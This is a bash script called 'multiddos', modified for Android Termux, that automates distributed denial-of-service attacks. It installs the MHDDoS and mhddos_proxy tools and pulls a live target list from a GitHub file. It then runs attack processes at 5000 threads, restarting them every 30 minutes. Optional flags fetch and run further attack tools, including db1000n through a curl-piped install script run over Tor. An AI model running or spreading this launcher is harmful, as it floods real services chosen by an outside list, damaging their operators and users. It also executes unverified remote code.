#!/bin/bash
# Modified for work with Android termux https://github.com/termux/termux-app/releases
# curl -Lk https://raw.githubusercontent.com/ignitedevua/multiddos/main/multiddos.sh -o multiddos && bash multiddos --lite -g
clear && echo -e "Loading... v0.9a\n"
apt-get update -q -y #>/dev/null 2>&1
apt-get install -q -y tmux python3 python3-pip 
pip install --upgrade pip >/dev/null 2>&1
rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside
rm -rf ~/tmp/ 2>&1; mkdir ~/tmp/

typing_on_screen (){
    tput setaf 2 &>/dev/null # green
    for ((i=0; i<=${#1}; i++)); do
        printf '%s' "${1:$i:1}"
        sleep 0.05$(( (RANDOM % 5) + 1 ))
    done
    tput sgr0 2 &>/dev/null
}
export -f typing_on_screen

#if launched in docker than variables saved in docker md.sh will be used
if [[ $docker_mode != "true" ]]; then
    gotop="on"
    db1000n="off"
    uashield="off"
    vnstat="off"
    proxy_finder="off"
fi

if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not set in cmd
if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # same for proxy_threads

### prepare target files (main and secondary)
prepare_targets_and_banner () {
export targets_curl=~/tmp/curl.uaripper
export targets_uniq=~/tmp/uniq.uaripper
export targets_lite=~/tmp/lite.uaripper
rm -f ~/tmp/*

# read targets from github, exclude comments and empty lines, put valid addresses on new line
echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
    if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
        for i in $LINE; do
            if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
                echo $i >> $targets_curl
            fi
        done
    fi
done

# find only uniq targets, randomize order and save them in $targets_uniq
cat $targets_curl | sort | uniq | sort -R > $targets_uniq

# Print greetings and number of targets; yes, utility name "toilet" is unfortunate
clear
echo -e " :::: MULTIDDOS ::::\n"
typing_on_screen 'Шукаю завдання...' ; sleep 0.5
echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_curl | wc -l)\x1b[m" && sleep 0.1
echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
echo -e "\nЗавантаження..."; sleep 3
clear
}
export -f prepare_targets_and_banner

launch () {
# kill previous sessions or processes in case they still in memory
tmux kill-session -t multidd > /dev/null 2>&1
pkill node shield> /dev/null 2>&1

# tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf > /dev/null 2>&1

if [[ $gotop == "on" ]]; then
    if [ ! -f "/usr/local/bin/gotop" ]; then
        curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
        dpkg -i gotop.deb
    fi
    tmux new-session -s multiddos -d 'gotop -sc solarized'
    tmux split-window -h -p 66 'bash auto_bash.sh'
else
    tmux new-session -s multiddos -d 'bash auto_bash.sh'
fi

if [[ $vnstat == "on" ]]; then
    apt -yq install vnstat
    tmux split-window -v 'vnstat -l'
fi

if [[ $db1000n == "on" ]]; then
    apt -yq install torsocks
    tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
fi

if [[ $uashield == "on" ]]; then
    tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
fi

if [[ $proxy_finder == "on" ]]; then
    tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
fi
tmux attach-session -t multidd
}

while [ "$1" != "" ]; do
    case $1 in
        +d | --db1000n )   db1000n="on"; shift ;;
        +u | --uashield )   uashield="on"; shift ;;
        -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
        +v | --vnstat ) vnstat="on"; shift ;;
        --lite ) export lite="on"; shift ;;
        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
        -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
        *   ) export args_to_pass+=" $1"; shift ;;
    esac
done

prepare_targets_and_banner

# create small separate script to re-launch only this small part of code
cat > auto_bash.sh << 'EOF'
# create swap file if system doesn't have it
# no pkg in termux
# if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
#    fallocate -l 1G /swp && chmod 600 /swp && mkswap /swp && swapon /swp
# fi

#install mhddos and mhddos_proxy
cd ~/multidd/
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt
git clone https://github.com/MHProDev/MHDDoS.git

# Restart and update targets every 30 minutes
while true; do
    pkill -f start.py; pkill -f runner.py
    if [[ $lite == "on" ]]; then
        tail -n 2000 $targets_uniq > $targets_lite
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
    else
        cd ~/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/tmp/xaa.uaripper $methods $threads $args_to_pass &
        sleep 15 # to decrease load on cpu during simultaneous start
        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/tmp/xab.uaripper $methods $threads $args_to_pass &
    fi
sleep 30m
prepare_targets_and_banner
done
EOF

launch
